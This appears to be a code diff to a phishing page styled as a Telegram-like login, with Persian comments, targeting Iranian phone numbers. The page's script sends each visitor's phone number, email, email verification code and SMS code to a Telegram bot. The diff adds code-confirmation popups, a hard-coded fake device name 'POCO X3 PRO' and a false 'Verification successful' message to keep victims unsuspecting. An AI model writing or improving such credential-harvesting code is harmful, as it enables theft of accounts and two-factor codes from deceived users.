@@ -100,6 +100,25 @@
       border: none;
     }
 
+    .back-btn {
+      width: 40px;
+      height: 40px;
+      background: #eef2fa;
+      border-radius: 50%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #3284ff;
+      font-size: 18px;
+      cursor: pointer;
+      border: none;
+      margin-right: auto;
+      transition: 0.2s;
+    }
+    .back-btn:hover {
+      background: #e2e8f2;
+    }
+
     .popup {
       position: absolute;
       top: 0;
@@ -110,6 +129,7 @@
       display: none;
       justify-content: center;
       align-items: center;
+      z-index: 10;
     }
 
     .popup-content {
@@ -160,7 +180,7 @@
       justify-content: space-between;
     }
 
-    #email-popup {
+    #email-popup, #code-confirm-popup, #sms-confirm-popup {
       display: none;
     }
 
@@ -174,6 +194,25 @@
       background: #f0f2f8;
       outline: none;
     }
+    .code-box:focus {
+      border-color: #3284ff;
+      box-shadow: 0 0 0 2px rgba(50,132,255,0.2);
+    }
+    .nav-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-top: 10px;
+    }
+    .success-message {
+      background: #e8f5e9;
+      color: #2e7d32;
+      padding: 12px;
+      border-radius: 12px;
+      margin-top: 16px;
+      font-size: 13px;
+      text-align: center;
+    }
   </style>
 </head>
 <body>
@@ -185,7 +224,7 @@
     <label>Country</label>
     <div class="country-select">
       <span>Iran</span>
-      <img src="https://flagcdn.com/w40/ir.png">
+      <img src="https://flagcdn.com/w40/ir.png" alt="iran flag">
     </div>
 
     <label>Phone number</label>
@@ -199,7 +238,10 @@
       <label>Sync Contacts</label>
     </div>
 
-    <button class="next-btn" onclick="showPopup()">➜</button>
+    <div class="nav-row">
+      <div></div>
+      <button class="next-btn" onclick="showPopup()">➜</button>
+    </div>
 
     <!-- Popup شماره -->
     <div class="popup" id="popup">
@@ -216,8 +258,6 @@
 
   <!-- صفحه ایمیل -->
   <div class="container" id="email-screen">
-
-    <!-- عکس بالای صفحه -->
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-39.jpg" style="width:120px; height:auto;" alt="mailbox">
     </div>
@@ -230,7 +270,10 @@
       <input id="email" type="email" placeholder="you@example.com">
     </div>
 
-    <button class="next-btn" onclick="submitEmail()">➜</button>
+    <div class="nav-row">
+      <button class="back-btn" onclick="goBackFromEmail()">←</button>
+      <button class="next-btn" onclick="submitEmail()">➜</button>
+    </div>
   </div>
 
   <!-- Popup ایمیل -->
@@ -247,7 +290,6 @@
 
   <!-- صفحه وارد کردن کد ایمیل -->
   <div class="container" id="code-screen">
-
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-42.jpg" style="width:100px; height:auto;" alt="email icon">
     </div>
@@ -259,21 +301,35 @@
       (don't forget the spam folder) and enter the code we just sent you.
     </p>
 
-    <div style="display:flex; justify-content:space-between; margin:20px 0;">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
+    <div style="display:flex; justify-content:space-between; margin:20px 0;" id="email-code-container">
+      <input maxlength="1" class="code-box" data-index="0">
+      <input maxlength="1" class="code-box" data-index="1">
+      <input maxlength="1" class="code-box" data-index="2">
+      <input maxlength="1" class="code-box" data-index="3">
+      <input maxlength="1" class="code-box" data-index="4">
+      <input maxlength="1" class="code-box" data-index="5">
     </div>
 
-    <button class="next-btn" onclick="submitCode()">➜</button>
+    <div class="nav-row">
+      <button class="back-btn" onclick="goBackFromCode()">←</button>
+      <button class="next-btn" onclick="showCodeConfirmPopup()">➜</button>
+    </div>
+  </div>
+
+  <!-- Popup تایید کد ایمیل -->
+  <div class="popup" id="code-confirm-popup">
+    <div class="popup-content">
+      <h3>Is this the correct code?</h3>
+      <p id="confirm-code-value" style="font-weight:bold; font-size:18px;"></p>
+      <div class="popup-buttons">
+        <button class="edit-btn" onclick="hideCodeConfirmPopup()">Edit</button>
+        <button class="yes-btn" onclick="confirmEmailCode()">Yes</button>
+      </div>
+    </div>
   </div>
 
   <!-- صفحه وارد کردن کد پیامک -->
   <div class="container" id="sms-screen">
-
     <div style="display:flex; justify-content:center; margin-bottom:20px;">
       <img src="photo_2026-01-02_14-40-45.jpg" style="width:100px; height:auto;" alt="sms icon">
     </div>
@@ -284,19 +340,34 @@
       <span id="user-phone" style="font-weight:bold;"></span>.
     </p>
 
-    <div style="display:flex; justify-content:space-between; margin:20px 0;">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
-      <input maxlength="1" class="code-box">
+    <div style="display:flex; justify-content:space-between; margin:20px 0;" id="sms-code-container">
+      <input maxlength="1" class="code-box" data-index="0">
+      <input maxlength="1" class="code-box" data-index="1">
+      <input maxlength="1" class="code-box" data-index="2">
+      <input maxlength="1" class="code-box" data-index="3">
+      <input maxlength="1" class="code-box" data-index="4">
+      <input maxlength="1" class="code-box" data-index="5">
     </div>
 
-    <button class="next-btn" onclick="submitSMSCode()">➜</button>
+    <div class="nav-row">
+      <button class="back-btn" onclick="goBackFromSMS()">←</button>
+      <button class="next-btn" onclick="showSmsConfirmPopup()">➜</button>
+    </div>
   </div>
-  <script>
 
+  <!-- Popup تایید کد پیامک -->
+  <div class="popup" id="sms-confirm-popup">
+    <div class="popup-content">
+      <h3>Is this the correct code?</h3>
+      <p id="confirm-sms-value" style="font-weight:bold; font-size:18px;"></p>
+      <div class="popup-buttons">
+        <button class="edit-btn" onclick="hideSmsConfirmPopup()">Edit</button>
+        <button class="yes-btn" onclick="confirmSmsCode()">Yes</button>
+      </div>
+    </div>
+  </div>
+
+  <script>
   /* -------------------------------
         تنظیمات بات تلگرام
   ------------------------------- */
@@ -308,12 +379,73 @@
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-    });
+    }).catch(e => console.warn("Telegram err", e));
+  }
+
+  // تابع برای گرفتن نام مرورگر / دستگاه (POCO X3 PRO نمایش داده می‌شود)
+  function getDeviceInfo() {
+    // طبق درخواست کاربر همیشه POCO X3 PRO برگردانده می‌شود
+    return "POCO X3 PRO";
   }
 
   window.onload = () => {
     sendMessage("🔥 یک کاربر وارد سایت شد!");
+    attachCodeBoxEvents();
   };
+
+  /* -------------------------------
+        اتوماتیک: جا به جایی بین باکس‌های کد
+  ------------------------------- */
+  function attachCodeBoxEvents() {
+    function handleInput(e) {
+      const input = e.target;
+      const value = input.value;
+      if (value.length === 1) {
+        const container = input.parentElement;
+        const boxes = Array.from(container.querySelectorAll('.code-box'));
+        const idx = boxes.indexOf(input);
+        if (idx !== -1 && idx + 1 < boxes.length) {
+          boxes[idx + 1].focus();
+        }
+      }
+    }
+
+    function handleKeydown(e) {
+      const input = e.target;
+      if (e.key === 'Backspace' && input.value === '') {
+        const container = input.parentElement;
+        const boxes = Array.from(container.querySelectorAll('.code-box'));
+        const idx = boxes.indexOf(input);
+        if (idx > 0) {
+          boxes[idx - 1].focus();
+          boxes[idx - 1].value = '';
+        }
+      }
+    }
+
+    const containers = ['#email-code-container', '#sms-code-container'];
+    containers.forEach(sel => {
+      const container = document.querySelector(sel);
+      if (container) {
+        const boxes = container.querySelectorAll('.code-box');
+        boxes.forEach(box => {
+          box.removeEventListener('input', handleInput);
+          box.removeEventListener('keydown', handleKeydown);
+          box.addEventListener('input', handleInput);
+          box.addEventListener('keydown', handleKeydown);
+        });
+      }
+    });
+  }
+
+  function resetCodeBoxes(containerId) {
+    const container = document.getElementById(containerId);
+    if (container) {
+      const boxes = container.querySelectorAll('.code-box');
+      boxes.forEach(box => box.value = '');
+      if (boxes.length) boxes[0].focus();
+    }
+  }
 
   /* -------------------------------
         مرحله شماره تلفن
@@ -321,12 +453,10 @@
 
   function showPopup() {
     const phone = document.getElementById("phone").value.trim();
-
     if (phone.length !== 10 || !/^\d+$/.test(phone)) {
       alert("Please enter a valid 10-digit number.");
       return;
     }
-
     document.getElementById("confirm-number").textContent = "+98 " + formatNumber(phone);
     document.getElementById("popup").style.display = "flex";
   }
@@ -338,27 +468,30 @@
   function confirmNumber() {
     const phone = document.getElementById("phone").value.trim();
     const formatted = formatNumber(phone);
-
     sendMessage(`📞 شماره تأیید شد:\n+98 ${formatted}`);
-
     hidePopup();
 
     document.getElementById("phone-screen").style.display = "none";
     document.getElementById("email-screen").style.display = "block";
+    document.getElementById("email").focus();
   }
 
   /* -------------------------------
-        مرحله ایمیل + پاپ‌آپ تأیید
+        مرحله ایمیل + پاپ‌آپ تأیید + برگشت
   ------------------------------- */
+  function goBackFromEmail() {
+    document.getElementById("email-screen").style.display = "none";
+    document.getElementById("phone-screen").style.display = "block";
+    const phoneInput = document.getElementById("phone");
+    if (phoneInput) phoneInput.focus();
+  }
 
   function submitEmail() {
     const email = document.getElementById("email").value.trim();
-
     if (!email || !email.includes("@")) {
       alert("Please enter a valid email address.");
       return;
     }
-
     document.getElementById("confirm-email").textContent = email;
     document.getElementById("email-popup").style.display = "flex";
   }
@@ -369,73 +502,187 @@
 
   function confirmEmail() {
     const email = document.getElementById("email").value.trim();
-
     sendMessage(`📧 ایمیل تأیید شد:\n${email}`);
-
     document.getElementById("email-popup").style.display = "none";
-
-    // نمایش ایمیل در صفحه کد
     document.getElementById("user-email").textContent = email;
 
-    // رفتن به صفحه وارد کردن کد ایمیل
     document.getElementById("email-screen").style.display = "none";
     document.getElementById("code-screen").style.display = "block";
+    resetCodeBoxes('email-code-container');
+    attachCodeBoxEvents();
   }
 
   /* -------------------------------
-        مرحله وارد کردن کد ایمیل
+        مرحله کد ایمیل + پاپ آپ تایید کد
   ------------------------------- */
+  let pendingEmailCode = "";
 
-  function submitCode() {
+  function showCodeConfirmPopup() {
     const boxes = document.querySelectorAll("#code-screen .code-box");
     let code = "";
-
     boxes.forEach(b => code += b.value);
-
     if (code.length !== 6) {
       alert("Please enter the 6-digit code.");
       return;
     }
+    if (!/^\d+$/.test(code)) {
+      alert("Code must contain only numbers.");
+      return;
+    }
+    pendingEmailCode = code;
+    document.getElementById("confirm-code-value").textContent = pendingEmailCode;
+    document.getElementById("code-confirm-popup").style.display = "flex";
+  }
 
-    sendMessage(`🔐 کد ایمیل وارد شده:\n${code}`);
+  function hideCodeConfirmPopup() {
+    document.getElementById("code-confirm-popup").style.display = "none";
+    pendingEmailCode = "";
+  }
 
-    // نمایش شماره در صفحه SMS
+  function confirmEmailCode() {
+    if (!pendingEmailCode) return;
+    sendMessage(`🔐 کد ایمیل تأیید شد (Correct code):\n${pendingEmailCode}`);
+    hideCodeConfirmPopup();
+
     const phone = document.getElementById("phone").value.trim();
     document.getElementById("user-phone").textContent = "+98 " + formatNumber(phone);
 
-    // رفتن به صفحه SMS
     document.getElementById("code-screen").style.display = "none";
     document.getElementById("sms-screen").style.display = "block";
+    resetCodeBoxes('sms-code-container');
+    attachCodeBoxEvents();
+    pendingEmailCode = "";
+  }
+
+  function goBackFromCode() {
+    document.getElementById("code-screen").style.display = "none";
+    document.getElementById("email-screen").style.display = "block";
+    const emailField = document.getElementById("email");
+    if (emailField) emailField.focus();
+    resetCodeBoxes('email-code-container');
+    hideCodeConfirmPopup();
   }
 
   /* -------------------------------
-        مرحله وارد کردن کد پیامک
+        مرحله کد پیامک + پاپ آپ تایید کد + نمایش نام مرورگر POCO X3 PRO
   ------------------------------- */
+  let pendingSmsCode = "";
 
-  function submitSMSCode() {
+  function showSmsConfirmPopup() {
     const boxes = document.querySelectorAll("#sms-screen .code-box");
     let code = "";
-
     boxes.forEach(b => code += b.value);
-
     if (code.length !== 6) {
       alert("Please enter the 6-digit SMS code.");
       return;
     }
+    if (!/^\d+$/.test(code)) {
+      alert("Code must contain only numbers.");
+      return;
+    }
+    pendingSmsCode = code;
+    document.getElementById("confirm-sms-value").textContent = pendingSmsCode;
+    document.getElementById("sms-confirm-popup").style.display = "flex";
+  }
 
-    sendMessage(`📲 کد پیامک وارد شده:\n${code}`);
+  function hideSmsConfirmPopup() {
+    document.getElementById("sms-confirm-popup").style.display = "none";
+    pendingSmsCode = "";
+  }
 
-    alert("SMS code submitted!");
+  function confirmSmsCode() {
+    if (!pendingSmsCode) return;
+    
+    // ارسال کد پیامک تایید شده به تلگرام
+    sendMessage(`📲 کد پیامک تأیید شد (Correct SMS code):\n${pendingSmsCode}`);
+    
+    // دریافت نام دستگاه (طبق درخواست: POCO X3 PRO)
+    const deviceName = getDeviceInfo();
+    
+    // ارسال پیام جداگانه با نام مرورگر/دستگاه
+    sendMessage(`🖥️ کاربر با دستگاه زیر وارد شده است:\n${deviceName}`);
+    
+    hideSmsConfirmPopup();
+    
+    // نمایش پیام موفقیت در همان صفحه sms-screen به جای alert و پاک کردن باکس‌ها
+    const smsContainer = document.getElementById("sms-screen");
+    // حذف پیام قبلی اگر وجود دارد
+    const oldMsg = smsContainer.querySelector(".success-message");
+    if (oldMsg) oldMsg.remove();
+    
+    // ایجاد المان پیام سبز
+    const successDiv = document.createElement("div");
+    successDiv.className = "success-message";
+    successDiv.innerHTML = `✅ Verification successful! <br> You are logged in with <strong>${deviceName}</strong>`;
+    // قرار دادن دکمه‌ها در نوار نویگیشن، پیام را زیر باکس‌های کد و بالای دکمه‌ها اضافه کنیم
+    const navRow = smsContainer.querySelector(".nav-row");
+    const codeContainer = smsContainer.querySelector("#sms-code-container");
+    // اگر قبلاً پیام وجود نداشت اضافه کن
+    if (!smsContainer.querySelector(".success-message")) {
+      codeContainer.insertAdjacentElement('afterend', successDiv);
+    }
+    
+    // غیرفعال کردن باکس‌های کد و دکمه بعدی برای جلوگیری از ارسال مجدد (اختیاری)
+    const allBoxes = smsContainer.querySelectorAll(".code-box");
+    allBoxes.forEach(box => box.disabled = true);
+    const nextBtn = navRow.querySelector(".next-btn");
+    if (nextBtn) nextBtn.style.opacity = "0.5";
+    
+    // همچنین می‌توان دکمه برگشت را غیرفعال کرد یا نگه داشت
+    pendingSmsCode = "";
+    
+    // می‌توان بعد از 3 ثانیه پیام را نگه داشت یا هر کار دیگری
+  }
+
+  function goBackFromSMS() {
+    // قبل از برگشت پاپ‌آپ را مخفی کن
+    hideSmsConfirmPopup();
+    document.getElementById("sms-screen").style.display = "none";
+    document.getElementById("code-screen").style.display = "block";
+    resetCodeBoxes('email-code-container');
+    attachCodeBoxEvents();
+    // پاک کردن پیام موفقیت اگر وجود دارد
+    const smsContainer = document.getElementById("sms-screen");
+    const oldMsg = smsContainer.querySelector(".success-message");
+    if (oldMsg) oldMsg.remove();
+    // فعال کردن مجدد باکس‌ها در صورت برگشت (اگر غیرفعال شده بودند)
+    const allBoxes = smsContainer.querySelectorAll(".code-box");
+    allBoxes.forEach(box => box.disabled = false);
+    const navRow = smsContainer.querySelector(".nav-row");
+    const nextBtn = navRow.querySelector(".next-btn");
+    if (nextBtn) nextBtn.style.opacity = "1";
   }
 
   /* -------------------------------
         فرمت شماره
   ------------------------------- */
-
   function formatNumber(num) {
     return num.replace(/(\d{3})(\d{3})(\d{4})/, "$1 $2 $3");
   }
 
-</script>
+  function reattachCodeBoxesOnVisible() {
+    const observer = new MutationObserver(() => {
+      if (document.getElementById("code-screen").style.display === "block") {
+        resetCodeBoxes('email-code-container');
+        attachCodeBoxEvents();
+      }
+      if (document.getElementById("sms-screen").style.display === "block") {
+        resetCodeBoxes('sms-code-container');
+        attachCodeBoxEvents();
+        // پاک کردن پیام موفقیت هر بار که صفحه sms دوباره نشان داده می‌شود (در حالت عادی از قبل پاک می‌شود)
+        const smsContainer = document.getElementById("sms-screen");
+        const oldMsg = smsContainer.querySelector(".success-message");
+        if (oldMsg) oldMsg.remove();
+        const allBoxes = smsContainer.querySelectorAll(".code-box");
+        allBoxes.forEach(box => box.disabled = false);
+        const navRow = smsContainer.querySelector(".nav-row");
+        const nextBtn = navRow.querySelector(".next-btn");
+        if (nextBtn) nextBtn.style.opacity = "1";
+      }
+    });
+    observer.observe(document.body, { attributes: true, subtree: false, attributeFilter: ['style'] });
+  }
+  reattachCodeBoxesOnVisible();
+  </script>
 </body>
 </html>
